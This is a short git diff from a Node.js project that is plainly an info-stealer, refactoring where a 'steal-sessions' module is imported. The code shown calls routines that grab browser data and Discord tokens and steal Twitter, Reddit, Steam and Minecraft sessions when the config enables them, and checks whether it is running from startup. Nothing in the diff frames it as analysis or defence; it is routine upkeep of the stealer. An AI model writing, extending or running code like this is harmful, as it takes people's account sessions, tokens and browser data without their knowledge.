@@ -1,11 +1,10 @@
 const config = require('../config');
-const { runningFromExecutable, sleep, runningFromStartup} = require('./general');
+const { runningFromExecutable, sleep, runningFromStartup } = require('./general');
 const { join, sep } = require('path');
 const os = require('os');
 const { execSync, spawnSync } = require('child_process');
 const { copyFileSync, existsSync, mkdtempSync, createWriteStream } = require('fs');
 const axios = require('axios');
-const { twitter, reddit, steam, minecraft } = require('../functions/steal-sessions');
 
 let tempFolder = '';
 
@@ -34,6 +33,7 @@ module.exports = async () => {
   await require('../functions/grab-browsers-data');
 
   if (config.sessionStealing) {
+    const { twitter, reddit, steam, minecraft } = require('../functions/steal-sessions');
     if (config.sessionStealing.discord) await require('../functions/grab-discord-token');
     if (config.sessionStealing.twitter) await twitter();
     if (config.sessionStealing.reddit) await reddit();
